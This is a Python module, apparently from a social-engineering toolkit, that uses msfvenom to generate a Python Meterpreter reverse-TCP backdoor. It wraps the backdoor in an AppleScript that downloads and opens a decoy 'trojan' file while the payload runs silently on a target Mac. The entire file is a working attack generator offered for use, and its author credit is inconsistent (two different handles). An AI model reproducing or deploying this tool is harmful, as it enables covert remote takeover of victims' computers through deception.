#!/usr/bin/python

print("Loading module. Please wait...")
import sys,os,src.core.setcore
	
MAIN="Mac shell script payload generator (by @evvanErb)"
AUTHOR="Evvan Erb"

def print_title():
        print("\n\n")
        print("*"*56)
        print("*" + " "*54 + "*")
        print("*Mac shell script payload generator (by @NathanielHugo)*")
        print("*" + " "*54 + "*")
        print("*"*56)
        print("\nThis module will generate a shell scirpt to create a python meterpreter reverse tcp backdoor in a mac.")
        print("The script will also open a trojan (innocuous) file on the target's mac while having the backdoor execute silently.")
	
def main():
	print_title()
	
	#Generate payload with msfvenom
	LHOST = raw_input("\nPlease enter LHOST:\n>>> ")
	LPORT = raw_input("\nPlease enter LPORT:\n>>> ")
	payloadName = raw_input("\nPlease enter where you would like the payload to be stored (exp:/tmp/mypay.py):\n>>> ")
	
	payloadScript = "msfvenom -p python/meterpreter/reverse_tcp LHOST=" + LHOST + " LPORT=" + LPORT + " >" + payloadName
	
	print("\n[*] Generating payload please wait...")
	os.system(payloadScript)
	
	inFile = open(payloadName, 'r')
	createdPayload = inFile.read()
	createdPayload = createdPayload.replace("\"", "\\\"")
	inFile.close()
	
	print("\n[*] python/meterpreter/reverse_tcp payload written to " + payloadName)
	
	#Generate shell scripts
	trojanFile = raw_input("\nPlease enter the url to the trojan file you want to be opened on the target's mac (exp:http://ellospics/pics/mypic.jpg):\n>>> ")
	trojanFileName = raw_input("\nPlease enter the name to the name of the trojan file (exp:mypic.jpg):\n>>> ")
	
	shellScript = "do shell script \"cd /tmp/; curl " + trojanFile + " -O -s; open " + trojanFileName + "; python -c \\\"" + createdPayload + "\\\";\""
	
	shellScriptOutFile = raw_input("\nPlease enter where would you like the final shell script to be stored (exp:/tmp/myshell.scpt):\n>>> ")
	
	outFile = open(shellScriptOutFile, 'w+')
	outFile.write(shellScript)
	outFile.close
	
	print("\n[*] Finished writing shell script to " + shellScriptOutFile)
	
	pause = raw_input("\nModule done please hit <enter> to finish")

